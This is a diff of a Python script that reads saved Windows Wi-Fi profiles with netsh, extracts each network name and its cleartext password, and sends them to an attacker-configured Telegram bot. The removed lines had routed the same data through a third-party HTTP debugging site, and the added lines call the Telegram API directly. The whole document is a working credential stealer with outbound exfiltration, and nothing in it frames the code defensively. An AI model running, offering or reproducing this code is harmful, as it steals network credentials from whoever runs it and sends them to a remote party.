@@ -2,56 +2,45 @@ import subprocess
 import requests
 import re
 
-# Enter Your Bot API Token Here(you can get this from @BotFather in telegram)
-
+# Enter Your Bot API Token Here (you can get this from @BotFather in telegram)
 BOT_API_TOKEN = ''
 
-# Enter Your Chat ID Here(you can get this from @raw_data_bot in telegram)
-
+# Enter Your Chat ID Here (you can get this from @raw_data_bot in telegram)
 CHAT_ID = ''
 
+# Function to get Wi-Fi profiles with passwords
+def get_wifi_profiles():
+    wifi_profiles = []
+    netsh_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout
+    profile_names = re.findall("All User Profile     : (.*)\r", netsh_output)
 
-# Checking If There Are Any Wifi Connections
-
-netsh_output = subprocess.run(
-    ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
-
-profile_names = (re.findall("All User Profile     : (.*)\r", netsh_output))
-
-wifi_list = []
-
-# If Saved Wifi Connections Were More Than Zero It Will Grab The Wifi Keys
-
-if len(profile_names) != 0:
     for name in profile_names:
-
-        wifi_profile = {}
-
-        profile_info = subprocess.run(
-            ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
-        if re.search("Security key           : Absent", profile_info):
+        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True, text=True).stdout
+        if "Security key           : Absent" in profile_info:
             continue
         else:
-            wifi_profile["ssid"] = name
-            profile_info_pass = subprocess.run(
-                ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
-            password = re.search(
-                "Key Content            : (.*)\r", profile_info_pass)
-            if password == None:
-                wifi_profile["password"] = None
-            else:
-                wifi_profile["password"] = password[1]
+            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True, text=True).stdout
+            password = re.search("Key Content            : (.*)\r", profile_info_pass)
+            wifi_profile = {"ssid": name, "password": password.group(1) if password else None}
+            wifi_profiles.append(wifi_profile)
 
-            wifi_list.append(wifi_profile)
+    return wifi_profiles
 
+# Send data to Telegram Bot
+def send_data_to_telegram(wifi_profiles):
+    for wifi_profile in wifi_profiles:
+        text = f"SSID: {wifi_profile['ssid']}, Password: {wifi_profile['password']}"
+        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}"
+        requests.get(url)
 
-# Sending Data To Telegram Bot
+if __name__ == "__main__":
+    wifi_profiles = get_wifi_profiles()
 
-for x in range(len(wifi_list)):
-    print(wifi_list[x])
-    url = (f"https://api.telegram.org/bot{BOT_API_TOKEN}/SendMessage?chat_id={CHAT_ID}&text=" + str(wifi_list[x]))
-    payload = {"UrlBox":url, "AgentList":"Mozilla Firefox", "Methodlist":"POST"}
-    requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)
+    if wifi_profiles:
+        send_data_to_telegram(wifi_profiles)
+    else:
+        print("No Wi-Fi profiles found.")
+
 
 # @AMLDevelopment on telegram
 # https://github.com/ItsAML
